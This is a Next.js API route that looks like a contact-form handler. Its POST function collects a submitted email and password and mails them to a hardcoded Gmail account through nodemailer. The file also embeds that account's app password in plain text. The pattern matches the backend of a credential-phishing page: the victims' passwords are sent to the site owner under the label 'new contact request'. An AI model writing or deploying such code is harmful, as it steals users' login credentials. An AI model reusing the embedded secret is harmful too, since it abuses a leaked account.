import { NextResponse } from "next/server";
import nodemailer from "nodemailer";
// import { json } from "next/dist/compiled/express/server/response";

export async function GET(req) {
  return new Response("Hello, Next.js!");
}


export async function POST(req) {
    if (req.method === "POST") {
      try {
        const formInfo = req.body;

        const output = `
            <h3>You have a new contact request</h3>
            <p>Email: ${req.body.email}</p>
            <p>Password: ${req.body.password}</p>
        `;

        const transporter = nodemailer.createTransport({
          service: "Gmail",
          auth: {
            user: "oemuraye@gmail.com",
            pass: "koolqqrjvvumygqt",
          },
        });

        console.log(req.body);

        const mailOptions = {
          from: "oemuraye@gmail.com",
        //   to: "augustine.ibenta@nationdelivery.com",
          to: "oemuraye@gmail.com",
          subject: "Form Submission",
          text: output,
        };

        const info = await transporter.sendMail(mailOptions);
        console.log("Email sent:", info);

        return NextResponse.json({ message: "Request successful", data: formInfo });
      } catch (error) {
        console.error("Error sending email:", error);
        return NextResponse.json({ error: "An error occurred" });
      }
    } else {
      return NextResponse.json({ error: "Method not allowed" });
    }
}